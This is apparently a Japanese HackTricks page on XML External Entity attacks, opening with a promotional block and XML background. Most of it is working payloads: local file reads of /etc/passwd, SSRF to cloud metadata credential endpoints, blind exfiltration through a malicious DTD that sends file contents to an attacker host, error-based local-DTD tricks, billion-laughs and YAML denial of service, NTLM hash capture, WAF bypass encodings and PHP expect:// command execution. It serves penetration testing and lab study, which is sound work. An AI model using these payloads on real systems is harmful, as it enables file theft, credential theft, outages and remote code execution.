# XXE - XEE - XML External Entity

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
- **ハッキングトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

XML External Entity攻撃は、XML入力を解析するアプリケーションに対する攻撃の一種です。

## XMLの基礎

**ほとんどはこの素晴らしいPortswiggerページに基づいています：** [**https://portswigger.net/web-security/xxe/xml-entities**](https://portswigger.net/web-security/xxe/xml-entities)

### 可拡張マークアップ言語の概要 <a href="#overview-of-extensible-markup-language" id="overview-of-extensible-markup-language"></a>

可拡張マークアップ言語（XML）は、データの格納と輸送に使用されるマークアップ言語として定義されています。HTMLと同様のタグとデータからなるツリー構造を採用し、XMLは事前に定義されたタグに制限されないことで特徴付けられます。この柔軟性により、データを記述的に表すタグの利用が可能となります。歴史的には、XMLはデータ輸送の形式として注目され、特に「AJAX」（「X」は「XML」を表す）への貢献で知られています。しかし、JSONが好まれる形式として浮上するにつれて、その人気は低下しています。

### XMLでのデータ項目の表現 <a href="#representation-of-data-items-in-xml-through-entities" id="representation-of-data-items-in-xml-through-entities"></a>

XMLでは、エンティティはドキュメント内のデータ項目を表現するメカニズムとして機能し、直接データを挿入する代替手段を提供します。XML仕様にはさまざまな組み込みエンティティが組み込まれています。たとえば、`&lt;`と`&gt;`はそれぞれ`<`と`>`文字を表します。これらのメタ文字はXMLタグを区切る役割を果たすため、これらがデータ内に表示される場合は、しばしばエンティティを使用して描写する必要があります。

### XML要素の定義

XMLでは、要素タイプ宣言が重要であり、XMLドキュメント内の要素の存在、タイプ、および順序のガイドラインを確立します。例として次のようなものがあります：

- `<!ELEMENT stockCheck ANY>`は、`<stockCheck></stockCheck>`要素が任意の種類のオブジェクトを囲むことを示します。
- `<!ELEMENT stockCheck EMPTY>`は、`<stockCheck></stockCheck>`要素がコンテンツを持たないようにすることを指示します。
- `<!ELEMENT stockCheck (productId,storeId)>`は、`<stockCheck>`要素が`<productId>`と`<storeId>`のみを子要素として含むことを指定します。

### ドキュメントタイプ定義の紹介 <a href="#introduction-to-document-type-definition" id="introduction-to-document-type-definition"></a>

ドキュメントタイプ定義（DTD）は、XMLにおいてXMLドキュメントの構造、許容されるデータ型などを指示する宣言を提供することで重要な役割を果たします。XMLドキュメントの冒頭に配置されるオプションの`DOCTYPE`要素は、DTDを宣言できます。DTDは、ドキュメントに完全に埋め込まれた場合に「内部」、外部ソースから読み込まれる場合に「外部」、またはその両方の組み合わせとして分類されます。

### XMLでのカスタムエンティティの利用 <a href="#utilization-of-custom-entities-in-xml" id="utilization-of-custom-entities-in-xml"></a>

XMLは、DTD内でカスタムエンティティを定義することを可能にします。例として次のような宣言があります：

`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`

このような宣言は、ドキュメント内のエンティティ参照`&myentity;`が「my entity value」に置き換わることを示します。

### XMLでの外部エンティティの組み込み <a href="#incorporation-of-external-entities-in-xml" id="incorporation-of-external-entities-in-xml"></a>

XMLの外部エンティティは、DTD外部に定義されたカスタムエンティティのサブタイプであり、これらのエンティティは`SYSTEM`キーワードを使用し、エンティティの値を取得する場所を指定するURLが必要です。これにより、[XML外部エンティティ攻撃](https://portswigger.net/web-security/xxe)が可能となります。

### XXE検出のためのXMLパラメータエンティティの悪用

標準エンティティが検証やXMLパーサーの強化によりXXE脆弱性を悪用するのに効果的でない場合、XMLパラメータエンティティを使用することができます。パーセント記号がエンティティ名の前に付加され、同じ文字で参照されることによって区別されるXMLパラメータエンティティは、DTD内でのみ参照されます。これにより、DNSルックアップの開始や攻撃者が制御するドメインへのHTTPリクエストを行うなどのアウトオブバンド手法を使用して、盲目的なXXE検出が可能となり、攻撃の成功を確認できます。


## 主な攻撃

**[これらの攻撃のほとんどは素晴らしいPortswiggers XEEラボを使用してテストされました：https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)**

### 新しいエンティティのテスト

この攻撃では、単純な新しいENTITY宣言が機能するかどうかをテストします
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
### ファイルの読み取り

さまざまな方法で `/etc/passwd` を読み取ってみましょう。Windows の場合は、`C:\windows\system32\drivers\etc\hosts` を読み取ることができます。

最初のケースでは、SYSTEM "_\*\*file:///\*\*etc/passwd_" も機能することに注意してください。
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
この2番目のケースは、WebサーバーがPHPを使用している場合にファイルを抽出するのに役立ちます（Portswiggers labsの場合ではありません）
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
この第3のケースでは、`Element stockCheck` を ANY として宣言していることに注意してください。
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
### ディレクトリリスト

**Java**ベースのアプリケーションでは、次のようなペイロードを使用してXXEを介してディレクトリの内容をリストアップすることができる場合があります（ファイルではなくディレクトリを要求するだけです）：
```markup
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

XXEを使用して、クラウド内でSSRFを悪用することができます。
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Blind SSRF

**以前にコメントされたテクニック**を使用すると、サーバーにアクセスして脆弱性を表示させることができます。しかし、それがうまくいかない場合、おそらく**XMLエンティティが許可されていない**ためかもしれません。その場合は、**XMLパラメータエンティティ**を使用してみることができます：
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Blind" SSRF - データの外部への持ち出し

**この場合、サーバーに悪意のあるペイロードを含む新しいDTDを読み込ませ、ファイルの内容をHTTPリクエストを介して送信します（複数行のファイルの場合は** _**ftp://**_**を介して持ち出すこともできます）。この説明は** [**こちらのPortswiggerのラボ**](https://portswigger.net/web-security/xxe/blind)**に基づいています。**

悪意のあるDTDには、データを持ち出すための一連の手順が記載されています。

### 悪意のあるDTDの例：
構造は以下の通りです：
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
以下は、このDTDによって実行される手順です：

1. **パラメータエンティティの定義:**
   - XMLパラメータエンティティ `%file` が作成され、`/etc/hostname`ファイルの内容を読み込みます。
   - 別のXMLパラメータエンティティ `%eval` が定義されます。これは新しいXMLパラメータエンティティ `%exfiltrate` を動的に宣言します。`%exfiltrate` エンティティは、URLのクエリ文字列内で `%file` エンティティの内容を渡すように設定されます。

2. **エンティティの実行:**
   - `%eval` エンティティが使用され、`%exfiltrate` エンティティの動的宣言が実行されます。
   - 次に `%exfiltrate` エンティティが使用され、ファイルの内容を含めた指定されたURLに対してHTTPリクエストがトリガーされます。

攻撃者は、通常 `http://web-attacker.com/malicious.dtd` のようなURLで、この悪意のあるDTDを自分の管理下のサーバーにホストします。

**XXEペイロード:**
脆弱なアプリケーションを悪用するために、攻撃者はXXEペイロードを送信します：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
このペイロードはXMLパラメータエンティティ`%xxe`を定義し、それをDTD内に組み込みます。XMLパーサーによって処理されると、このペイロードは攻撃者のサーバーから外部DTDを取得します。その後、パーサーはDTDをインラインで解釈し、悪意のあるDTDに記載された手順を実行し、`/etc/hostname`ファイルを攻撃者のサーバーに外部流出させます。


### エラーベース（外部DTD）

**この場合、サーバーに悪意のあるDTDを読み込ませ、エラーメッセージ内にファイルの内容を表示させます（これはエラーメッセージを見ることができる場合にのみ有効です）。** [**こちらの例から。**](https://portswigger.net/web-security/xxe/blind)

以下のように、悪意のある外部DTDを使用して、`/etc/passwd`ファイルの内容が含まれたXMLパースエラーメッセージをトリガーできます：
```markup
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
このDTDは次の手順を実行します：

* `/etc/passwd` ファイルの内容を含む XML パラメータエンティティ `file` を定義します。
* 別の XML パラメータエンティティ `error` の動的宣言を含む XML パラメータエンティティ `eval` を定義します。`error` エンティティは、`file` エンティティの値を含む存在しないファイルをロードすることで評価されます。
* `eval` エンティティを使用し、`error` エンティティの動的宣言が実行されます。
* `error` エンティティを使用し、その値が評価され、存在しないファイルをロードしようとしてエラーメッセージが生成されます。このエラーメッセージには、`/etc/passwd` ファイルの内容である存在しないファイルの名前が含まれます。

外部 DTD エラーを呼び出すには、以下を使用します：
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### **エラーベース（system DTD）**

では、**アウトオブバンドインタラクションがブロックされている**場合の盲目的なXXE脆弱性はどうでしょうか？。

XML言語仕様の抜け穴により、**ドキュメントのDTDが内部および外部の宣言を混在させたときにエラーメッセージを通じて機密データが公開**される可能性があります。この問題により、外部で宣言されたエンティティを内部で再定義することが可能となり、エラーベースのXXE攻撃を実行できます。このような攻撃は、元々外部DTDで宣言されたXMLパラメータエンティティを内部DTD内から再定義することを悪用します。サーバーによってアウトオブバンド接続がブロックされている場合、攻撃者は攻撃を実行するためにローカルDTDファイルに依存する必要があり、パーシングエラーを誘発して機密情報を明らかにすることを目指します。

サーバーのファイルシステムに`/usr/local/app/schema.dtd`にあるDTDファイルが存在し、`custom_entity`というエンティティが定義されているとします。攻撃者は、次のようにハイブリッドDTDを送信することで、`/etc/passwd`ファイルの内容を明らかにするXMLパーシングエラーを誘発することができます：
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
以下の手順は、このDTDによって実行されます：

- `local_dtd` という名前のXMLパラメータエンティティの定義に、サーバーのファイルシステムにある外部DTDファイルが含まれています。
- 外部DTDで元々定義されていた `custom_entity` XMLパラメータエンティティの再定義が行われ、[エラーベースのXXE攻撃](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages)をカプセル化するように設計されています。この再定義は、`/etc/passwd` ファイルの内容を公開するためにパースエラーを引き起こすことを意図しています。
- `local_dtd` エンティティを使用することで、外部DTDが参照され、新しく定義された `custom_entity` が含まれます。これらのアクションの連続によって、攻撃によって狙われたエラーメッセージが発生します。

**実際の例:** GNOMEデスクトップ環境を使用しているシステムでは、`/usr/share/yelp/dtd/docbookx.dtd` にDTDがあり、`ISOamso` というエンティティが含まれています。
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
以下のテクニックは**内部DTDを使用**するため、まず**有効なDTDを見つける必要があります**。これを行うには、サーバーが使用している**OS/ソフトウェアをインストール**して、**デフォルトのDTDを検索**するか、システム内の**デフォルトのDTDのリストを取得**して、存在するかどうかを**確認**できます：
```markup
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
For more information check [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### システム内のDTDの検出

次の素晴らしいgithubリポジトリでは、**システム内に存在する可能性のあるDTDのパス**を見つけることができます:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

さらに、**被害者システムのDockerイメージ**を持っている場合、同じリポジトリのツールを使用して**イメージをスキャン**し、システム内に存在する**DTDのパス**を**見つける**ことができます。詳細については、[githubのReadme](https://github.com/GoSecure/dtd-finder)を参照してください。
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### Office Open XMLパーサーを介したXXE

この攻撃の詳細については、**Detectifyの[この素晴らしい投稿](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/)の第2セクションを参照してください**。

多くのWebアプリケーションが**Microsoft Officeドキュメントのアップロード機能を提供**しており、その後これらのドキュメントから特定の詳細を抽出します。たとえば、WebアプリケーションがXLSX形式のスプレッドシートをアップロードしてデータをインポートすることを許可するかもしれません。パーサーがスプレッドシートからデータを抽出するためには、少なくとも1つのXMLファイルを解析する必要があります。

この脆弱性をテストするためには、**XXEペイロードを含むMicrosoft Officeファイルを作成する**必要があります。最初のステップは、ドキュメントを解凍できる空のディレクトリを作成することです。

ドキュメントが解凍されたら、`./unzipped/word/document.xml`にあるXMLファイルを好きなテキストエディタ（たとえばvim）で開いて編集する必要があります。XMLを編集して、通常はHTTPリクエストで始まる所望のXXEペイロードを含める必要があります。

変更されたXML行は、2つのルートXMLオブジェクトの間に挿入する必要があります。リクエストを監視可能なURLに置き換えることが重要です。

最後に、ファイルをzip化して悪意のあるpoc.docxファイルを作成できます。以前に作成した「unzipped」ディレクトリから、次のコマンドを実行する必要があります：

これで、作成したファイルを潜在的に脆弱なWebアプリケーションにアップロードし、Burp Collaboratorログにリクエストが表示されることを期待できます。


### Jar: プロトコル

`jar`プロトコルは**Javaアプリケーション**でのみ利用可能です。これは**PKZIP**ファイル（`.zip`、`.jar`など）内のファイルにアクセスし、ローカルおよびリモートファイルに対応しています。
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
PKZIPファイル内のファイルにアクセスできると、**システムDTDファイルを介したXXEの悪用が非常に有用**です。[こちらのセクションをチェックして、システムDTDファイルを悪用する方法を学びます](xxe-xee-xml-external-entity.md#error-based-system-dtd)。
{% endhint %}

#### 裏側

1. zipアーカイブをロードするためにHTTPリクエストを行います。 `https://download.host.com/myarchive.zip`
2. HTTPレスポンスを一時的な場所に保存します。 `/tmp/...`
3. アーカイブを展開します。
4. `file.zip`を読み取ります。
5. 一時ファイルを削除します。

流れを2番目のステップで停止させることが可能であることに注意してください。ファイルを提供する際に接続を閉じないようにするトリックがあります。[このツールが役立つ場合があります](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution)：Pythonの`slow_http_server.py`とJavaの`slowserver.jar`があります。

サーバーがファイルをダウンロードしたら、一時ディレクトリをブラウズしてその場所を見つける必要があります。ランダムであるため、ファイルパスは事前に予測できません。

![Jar](https://gosecure.github.io/xxe-workshop/img/74fac3155d455980.png)

{% hint style="danger" %}
一時ディレクトリにファイルを書き込むことは、**パストラバーサルを含む別の脆弱性をエスカレート**するのに役立ちます（ローカルファイルのインクルード、テンプレートインジェクション、XSLT RCE、逆シリアル化など）。
{% endhint %}

### XSS
```markup
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### ビリオン・ラフ攻撃
```markup
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml攻撃
```markup
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### 二次の膨張攻撃

![](<../.gitbook/assets/image (531).png>)

#### NTMLの取得

Windowsホストでは、responder.pyハンドラを設定することで、ウェブサーバーユーザーのNTMLハッシュを取得することが可能です。
```
Responder.py -I eth0 -v
```
そして、以下のリクエストを送信することによって
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
## 隠されたXXEサーフェス

### XInclude

いくつかのシナリオでは、**クライアントから送信されたデータが、解析前にサーバーサイドプロセスによってXMLドキュメントに組み込まれる**。これは通常、クライアントデータが**バックエンドのSOAPリクエスト**に統合され、その後バックエンドでSOAPサービスによって処理される場合に発生します。

これらのケースでは、XMLドキュメント全体を制御することが制限されているため、従来のXXE（XML External Entity）攻撃を実行することは困難です。特に、`DOCTYPE`要素を変更または導入することができないためです。ただし、XML標準の機能である`XInclude`を活用することで、回避策が提供されます。このアプローチにより、XMLドキュメントのデータ要素内で`XInclude`攻撃を実行できるため、サーバーが生成したXMLドキュメントに埋め込まれた個々のデータに制限されている場合にも実現可能となります。

`XInclude`攻撃を開始するには、`XInclude`名前空間の組み込みと、組み込みを意図するファイルパスの指定が必要です。次の例は、そのような攻撃がどのように構築されるかを示しています：
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Check [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) for more info!

### SVG - ファイルのアップロード

ユーザーが特定のアプリケーションにアップロードしたファイルは、サーバーで処理されることがあり、XMLやXMLを含むファイル形式の処理方法に脆弱性が潜んでいる可能性があります。オフィス文書（DOCX）や画像（SVG）などの一般的なファイル形式は、XMLに基づいています。

ユーザーが**画像をアップロード**すると、これらの画像はサーバーサイドで処理または検証されます。PNGやJPEGなどの形式を期待しているアプリケーションでも、**サーバーの画像処理ライブラリがSVG画像をサポート**している可能性があります。XMLベースのフォーマットであるSVGは、攻撃者が悪意のあるSVG画像を送信して、サーバーをXXE（XML External Entity）の脆弱性にさらすことができます。

以下は、悪意のあるSVG画像がシステムファイルを読み取ろうとする攻撃の例です：
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
別の方法は、PHPの「expect」ラッパーを介して**コマンドを実行**しようとすることです：
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
両方のインスタンスで、SVG形式が使用され、サーバーソフトウェアのXML処理機能を悪用する攻撃が発生し、堅牢な入力検証とセキュリティ対策の必要性が強調されています。

詳細については、[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) をチェックしてください！

**最初の行がファイルの読み取りまたは実行結果の内部に表示されることに注意してください。したがって、SVGが作成した画像にアクセスできる必要があります。**

### **PDF - ファイルのアップロード**

次の投稿を読んで、**PDFファイルをアップロードしてXXEを悪用する方法**を学んでください：

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: x-www-urlencodedからXMLへ

POSTリクエストがXML形式のデータを受け入れる場合、そのリクエストでXXEを悪用することができます。たとえば、通常のリクエストに次の内容が含まれている場合：
```markup
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
その後、同じ結果を得るために、次のリクエストを送信できるかもしれません:
```markup
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: JSON から XEE へ

リクエストを変更するには、「**Content Type Converter**」という Burp 拡張機能を使用できます。[こちら](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html)にこの例があります。
```markup
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```markup
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
別の例は[こちら](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2)にあります。

## WAF & Protections Bypasses

### Base64
```markup
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
これは、XMLサーバーが`data://`プロトコルを受け入れる場合にのみ機能します。

### UTF-7

\[**"Encode Recipe**" of cyberchef here ]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) でUTF-7に変換できます。
```markup
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```markup
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### ファイル:/ プロトコル バイパス

Web が PHP を使用している場合、`file:/` の代わりに **php ラッパー** `php://filter/convert.base64-encode/resource=` を使用して **内部ファイルにアクセス** できます。

Web が Java を使用している場合は、[**jar: プロトコル**](xxe-xee-xml-external-entity.md#jar-protocol) をチェックできます。

### HTML エンティティ

[**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes) からのトリック\
**エンティティ内にエンティティ** を作成し、**html エンティティ** でエンコードしてからそれを呼び出して **dtd をロード** することができます。\
使用される **HTML エンティティ** は **数値** である必要があることに注意してください（この例では \[この例で\]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C))。
```markup
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTDの例：
```markup
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP ラッパー

### Base64

**抽出** _**index.php**_
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **外部リソースの抽出**
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### リモートコード実行

**PHPの"expect"モジュールがロードされている場合**
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**

### **XML External Entity (XEE) Injection**

XML External Entity (XEE) Injection is a type of attack on an application that parses XML input. An attacker can exploit vulnerabilities in the way the application processes XML input to disclose confidential data, execute remote code, or perform other malicious activities. This attack is commonly used in SOAP web services that utilize XML for data exchange.
```markup
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

この例は、[https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)を参考にしています。

XLIFF（XML Localization Interchange File Format）は、ローカライゼーションプロセスでのデータ交換を標準化するために使用されます。これは、主にローカライズツール間でローカライズ可能なデータを転送するために使用されるXMLベースの形式であり、CAT（Computer-Aided Translation）ツールの共通の交換形式としても使用されます。

### Blind Request Analysis

次の内容でサーバーにリクエストが送信されます：
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
